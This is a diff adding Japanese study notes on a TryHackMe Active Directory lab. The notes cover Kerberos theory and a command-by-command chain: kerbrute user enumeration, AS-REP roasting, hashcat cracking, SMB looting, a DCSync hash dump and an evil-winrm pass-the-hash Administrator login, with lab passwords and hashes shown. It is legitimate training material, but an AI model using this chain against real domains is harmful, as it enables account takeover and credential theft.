@@ -535,13 +535,313 @@ WantedBy=multi-user.target' > $TF
 - PHPがファイルアップロード・実行できると、	Firewallをすり抜けてリバースシェルでshellを奪われる
 - 不用意に実行ファイルにSUIDを付与していると脆弱性となり昇格権限されてしまう
 
-## Day6
-### kerbruteのインストール
+## Day6：ActiveDirectoryへの攻撃
+[Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)  
+ActiveDirectoryは、会社や学校などの組織のPCを一元管理するWindowsサーバー上で動作するシステム。
+ActiveDirectoryで利用されるKerberos認証の脆弱性をハッキングして、不正ログインと権限昇格をする。
+
+### 事前準備：kerbruteのインストール
 書籍のkerbrute_linux_amd64はUTM上では動かないそうなので下サイトに従って対応する。
 - [書籍「7日間でハッキングをはじめる本」をM1Macで完遂できるようにしたこと](https://qiita.com/yama53san/items/dc96912ff565143c51ed)
 
-### Day6勉強したこと
+git からkerbruteをclone
+```
+git clone https://github.com/ropnop/kerbrute.git
+```
 
+Makefileを編集
+```
+ce kerbrute
+nano Makefile
+```
+
+ARCHSの文末にarm64を追記
+```
+ARCHS=amd64 386 arm64
+```
+
+以下を管理者権限で実行
+```
+sudo apt update
+sudo apt install golang-go
+```
+
+buildの成功
+```
+┌──(kali㉿kali)-[~/7DaysHacking/Day6/kerbrute]
+└─$ make linux
+Building for linux amd64...
+Building for linux 386...
+Building for linux arm64...
+Done.
+```
+
+dist配下に`kerbrute_linux_arm64`ができているので実行してスクリプトが流れたら大丈夫。
+![](../img/Book/7DayHacking/7DayHacking_day6_1.png)
+
+
+### 偵察
+まずはいつも通り、nmapでネットワークを調査してみる。以下をチェック
+- 88:kerberos
+- 135:RPC(Remote Procedure Call)
+- 139/445:SMB
+- 3389:Windowsのリモートデスクトップ
+
+```
+Host is up (0.33s latency).
+Not shown: 987 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-20 03:47:10Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+```
+
+対象を絞って調査
+```
+nmap -p 88,135,139,3389 -A -Pn -oN nmap-2.txt -v 10.10.x.x
+```
+結果は以下にドメイン名があることがわかる
+- NetBIOS_Domain_Name: THM-AD
+- DNS_Domain_Name: spookysec.local
+今後はspookysec.localのドメインを利用する。
+
+```
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-04-20T03:49:34+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-04-20T03:49:21+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+
+### ActiveDirectoryとは
+ActiveDirectoryは所属するユーザーID/パスワード管理やユーザー認証、認可ログの集約などを一元管理することができる。
+一元管理できることは便利ではあるが、攻撃の対象になりやすい。
+- ドメイン：情報を管理する範囲
+- ドメインコントローラー：ドメイン情報を持っているサーバー
+![](../img/Book/7DayHacking/7DayHacking_day6_3.png)
+[Active Directory（アクティブディレクトリ）とは？初心者にもわかりやすく解説](https://www.ntt.com/business/services/security/security-management/wideangle/lp/lp10.html)
+
+### Kerberos認証とは
+Kerberos認証とは、クライアントに対して、認証を行いチケットを払い出して、サービスの利用を許可する仕組み。
+登場する用語は以下の通り。
+
+|略称|正式名称|役割・説明|
+|:----|:----|:----|
+|KDC|Key Distribution Center|認証の中枢。以下のASとTGSを内包する。|
+|｜--- AS|Authentication Server|クライアントの認証を行い、TGTを発行する。|
+|｜--- TGS|Ticket Granting Server|TGTを使ってサービス用のチケット（ST）を発行する。|
+|TGT|Ticket Granting Ticket|一時的な認証トークン。TGSにサービスチケット(ST)を要求する際に使用される。|
+|ST|Service Ticket|サービスにアクセスするためのチケット。サーバーがこのチケットを確認して許可する。|
+
+認証のイメージとしては以下。
+最初にTGTを認証によって払い出してもらって、TGTを利用してSTを払い出してもらうという流れ。
+![](../img/Book/7DayHacking/7DayHacking_day6_4.png)
+[【図解】初心者にも分かるKerberos認証とspnegoの仕組み ～SSOのシーケンス,統合windows認証について～](https://milestone-of-se.nesuke.com/sv-advanced/activedirectory/kerberos-spnego/)
+
+### AS-REP Roasting攻撃
+Kerberosの設定において、認証を簡略化した方法を利用している場合脆弱性となりうる。
+- 前提
+    - ASに対してTGTを発行を発行してもらう際「事前認証」設定がある
+    - 事前認証では、時間などをユーザーの秘密鍵を利用して暗号化してもらうことで本人確認を行う
+    - 本人確認が取れたらTGTをレスポンスする
+    - TGTの事前認証については、必須ではないためスキップが可能
+    - TGTの中にはパスワードのハッシュ値が入っているが、暗号化されているのでTGTが流出しても本来は利用できない
+- 攻撃方法
+    - 事前認証をスキップになっているユーザーを調査
+    - 事前認証をスキップしてTGTを取得
+    - TGTのハッシュをクラッシュしてパスワードを割り出す
+
+#### Kerbruteでユーザー調査
+事前準備でkerbruteの実行はできているので、攻撃対象の設定をする。
+
+kali上の`/etc/hosts`にIPとドメインの名前解決の設定をしておく
+```
+sudo nano /etc/hosts
+```
+最終行に以下を追加(間はtab)
+```
+10.10.x.x   spookysec.local
+```
+試しにPingを打って返事が来ればOK
+```
+ping spookysec.local
+-->64 bytes from spookysec.local (10.10.100.203): icmp_seq=1 ttl=124 time=720 ms
+-->64 bytes from spookysec.local (10.10.100.203): icmp_seq=1 ttl=124 time=720 ms
+```
+
+攻撃用のユーザーリストとパスワードリストについては今回TryHackMeのRoomのTask4に準備されているのでDLしておく。
+本来は、元々Kaliに準備されている辞書を利用するべきだが、今回は事前準備されているものを利用する。
+```
+wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
+```
+
+Userを割り出すためにKerbruteを利用して実行
+- userenum: ユーザー名の列挙
+- -d: 対象ドメイン指定
+- --dc: ドメインコントローラー指定
+- userlist.txt: 利用する辞書
+```
+./kerbrute/dist/kerbrute_linux_arm64 userenum -d spookysec.local --dc spookysec.local userlist.txt
+```
+
+![](../img/Book/7DayHacking/7DayHacking_day6_2.png)
+
+結果として最初からいるアカウント（ビルトインアカウント）でもないし重要性なユーザーっぽいのでこの辺りに狙いを定める
+- svc-admin@spoolysec.local
+- backup@spookysec.local
+
+
+### TGTの取得とハッシュからパスワードをクラッシュ
+#### Impacketを利用したTGTの取得
+Impacketは、さまざまなプロトコルをプログラムから操作しやすくなるためのライブラリやツールの集まり。
+GetNPUser.pyを利用して、取得したユーザーを利用してTGTを取得してみる
+
+以下を実行してパスワードは未記入でEnter
+```
+./GetNPUsers.py spookysec.local/svc-admin   
+```
+得られたTGTが以下
+```
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f~~~~~555
+```
+得られたHash値はhash.txtに書き込んでおく
+
+#### Hashのクラッシュ
+取得できたTGTのハッシュからhashcatを利用してhash解析をしてパスワードを取得。
+
+hashcatでは、解析したいハッシュ対象を指定するため、確認するとAS-REQは18200
+```
+┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ hashcat -h |grep Kerberos
+  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
+```
+hashcatを実行してみると、management2005がパスワードとわかる！
+```
+Dictionary cache built:
+* Filename..: passwordlist.txt
+* Passwords.: 70188
+* Bytes.....: 569236
+* Keyspace..: 70188
+* Runtime...: 0 secs
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f~~~~~555:management2005
+```
+
+IDとパスワードからSMBサービスにログインをしてみる。
+SMBのポートを利用してファイルサーバーにアクセスしてみる
+```
+┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ smbclient -L \\\\spookysec.local -U svc-admin    
+Password for [WORKGROUP\svc-admin]:management2005
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backup          Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+```
+backupの中身からbackupユーザーのIDとPWを取得
+```
+┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ smbclient  \\\\spookysec.local\\backup -U svc-admin
+Password for [WORKGROUP\svc-admin]:management2005
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Apr  5 04:08:39 2020
+  ..                                  D        0  Sun Apr  5 04:08:39 2020
+  backup_credentials.txt              A       48  Sun Apr  5 04:08:53 2020
+       
+                8247551 blocks of size 4096. 3668238 blocks available
+smb: \> get backup_credentials.txt 
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \> exit
+
+┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ less backup_credentials.txt 
+
+┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ cat backup_credentials.txt 
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw       
+```
+
+最後に、得られた値がBase64dエンコードされている可能性があるので解読すると`backup2517860`がパスワードとわかる
+```
+┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ cat backup_credentials.txt|base64 -d                        
+backup@spookysec.local:backup2517860
+```
+
+
+### DCSync攻撃
+DCSync攻撃とは、ドメインコントローラーのバックアップ権限を持っているユーザーを利用して、バックアップ時にパスワード情報を抜き取る。
+ActiveDirectoryでは、パスワード情報などを暗号化したNTLMハッシュとして保管されている。
+
+#### Impacketを利用したDCsync
+Impacketのツールを利用して、DCsyncを実行
+```
+┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ ./secretsdump.py -just-dc-ntlm backup@spookysec.local -outputfile spookysec
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:backup2517860
+```
+結果として、NTLMハッシュが出力され、AdminのパスワードのNTLMハッシュ値`0e0~~4fc`が取得できる
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+~~~
+~~~
+```
+
+
+### Pass the HashでAdminをハック
+NTLMでは、ユーザー名とハッシュ化されたパスワードが保管されている。
+`Pass the Hash`ではユーザー情報とハッシュをそのまま利用して認証を済ましてしまうNTLM認証の脆弱性を突いて、ユーザーになりすます。
+
+Evil-WinRMというツールを利用することでPass the Hash攻撃を行ってroot.txtを取得
+```
+┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+~~~
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
+TryHackMe{4ctiveD1rectoryM4st3r}
+```
+
+
+### Day6勉強したこと
+- ActiveDirecrotyは組織のPCなどの管理を行うサービス
+- ActiveDirectoryにはKerberos認証を利用されている
+- Kerberosで事前認証をOFFにすると脆弱性となりうる
+- 認証のチケットと認可のチケットを利用するが認証チケットからパスワードが解析される可能性あり
+- ActiveDirectoryのbackup権限を持つユーザーを奪われるとパスワード全体が流出する可能性あり
 
 ## Day7
 ### Day7勉強したこと
